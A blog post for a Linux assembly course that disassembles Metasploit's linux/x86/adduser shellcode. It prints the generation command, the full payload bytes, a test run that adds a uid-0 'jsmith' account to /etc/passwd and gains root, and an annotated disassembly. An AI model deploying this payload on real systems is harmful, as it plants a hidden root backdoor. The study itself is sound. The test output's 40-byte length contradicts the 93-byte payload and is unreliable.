---
title:  "[SLAE] Assignment 5 - Metasploit Shellcode analysis"
---

![Logo](/assets/images/tux-root.png)

## Metasploit Linux adduser shellcode analysis
This post is part of the 5th assignment of the SLAE course and will analyse the Metasploit _`linux/x86/adduser shellcode`_. First let's generate the shellcode: 
```bash
# msfpayload linux/x86/adduser USER=jsmith PASS=ok  C
```

This will generate a payload that will create a new -`root`_ user, with uid and gid equal to 0. 
```c
/*
 * linux/x86/adduser - 93 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, USER=jsmith, PASS=ok, SHELL=/bin/sh
 */
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x24\x00\x00\x00\x6a\x73"
"\x6d\x69\x74\x68\x3a\x41\x7a\x2e\x54\x4f\x53\x72\x67\x72\x4d"
"\x36\x72\x6f\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e"
"\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01"
"\x58\xcd\x80";
```

To test it, I've integrated the shellcode into a C skeleton file and run against a Linux box: 
```bash
# cat /etc/passwd | grep jsmith
# ./shellcode
Shellcode Length:  40 bytes
# cat /etc/passwd | grep jsmith
jsmith:Az.TOSrgrM6ro:0:0::/:/bin/sh
# su jsmith
# id
uid=0(root) gid=0(root) groups=0(root)
```

As we can see, the new root user was successfully created. Next I continued to disassemble it: 
```bash
$ echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x24\x00\x00\x00\x6a\x73\x6d\x69\x74\x68\x3a\x41\x7a\x2e\x54\x4f\x53\x72\x67\x72\x4d\x36\x72\x6f\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" |ndisasm -b 32 -
```
First the shellcode restores the privileges, in case the running process would have dropped them: 
```asm
00000000  31C9              xor ecx,ecx             ; Effective user id - 0
00000002  89CB              mov ebx,ecx             ; Real user id - 0
00000004  6A46              push byte +0x46         ; sys_setreuid16 syscall number
00000006  58                pop eax                 ; Sets real and effective user id
00000007  CD80              int 0x80                ; Fire the interrupt
```

Next, it will open the /etc/passwd file. The flags for opening the file will be set to 0x00000401: O_WRONLY|O_APPEND. (Note1: the mode for opening the file, which should have been in EDX register, is not specified because it is ignored for O_CREAT flag not specified): 
00000009  6A05              push byte +0x5
0000000B  58                pop eax                 ; Prepare eax for sys_open syscall
0000000C  31C9              xor ecx,ecx             ; Set ecx to 0 
0000000E  51                push ecx                ; Push 0 to act as a null terminator
0000000F  6873737764        push dword 0x64777373   ; 'dwss'
00000014  682F2F7061        push dword 0x61702f2f   ; 'ap//'
00000019  682F657463        push dword 0x6374652f   ; 'cte/'
0000001E  89E3              mov ebx,esp             ; Filename: '/etc//passwd'
00000020  41                inc ecx  
Note2: the open syscall and the parameters can also be easily viewed using strace program: 
?
1
2
3
# strace ./shellcode
. . . 
open("/etc//passwd", O_WRONLY|O_APPEND) = 3 
The next part will write the "jsmith:Az.TOSrgrM6ro:0:0::/:/bin/sh\n" string to it (username and encrypted password): 
00000025  93                xchg eax,ebx
00000026  E824000000        call dword 0x4f
; String starts  here -->
; jsmith:Az.TOSrgrM6ro:0:0::/:/bin/sh\n
0000002B  6A73              push byte +0x73
0000002D  6D                insd
0000002E  6974683A417A2E54  imul esi,[eax+ebp*2+0x3a],dword 0x542e7a41
00000036  4F                dec edi
00000037  53                push ebx
00000038  7267              jc 0xa1
0000003A  724D              jc 0x89
0000003C  36726F            ss jc 0xae
0000003F  3A30              cmp dh,[eax]
00000041  3A30              cmp dh,[eax]
00000043  3A3A              cmp bh,[edx]
00000045  2F                das
00000046  3A2F              cmp ch,[edi]
00000048  62696E            bound ebp,[ecx+0x6e]
0000004B  2F                das
0000004C  7368              jnc 0xb6
0000004E  0A. |--> String ends here
We then have to disassemble the instructions starting after the end of string (easily done in gdb): 
00000051  51                push ecx
00000052  FC                cld
00000053  6A04              push byte +0x4
00000055  58                pop eax         ; sys_write syscall
00000056  CD80              int 0x80
; write(3, "jsmith:Az.TOSrgrM6ro:0:0::/:/bin"..., 36) = 36
Finally the shellcode calls the exit function to cleanly finish execution: 
00000058  6A01              push byte +0x1
0000005A  58                pop eax         ; sys_exit syscall
0000005B  CD80              int 0x80

The complete source files and scripts mentioned in this post can be found in the Git repository:
SLAE

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:        
www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/    
Student ID: SLAE- 449 
Posted by Liviu at 6:50 PM     
Email This
BlogThis!
Share to Twitter
Share to Facebook
Share to Pinterest

Labels: adduser, metasploit, shellcode, SLAE
Reactions: 	
No comments:
Post a Comm
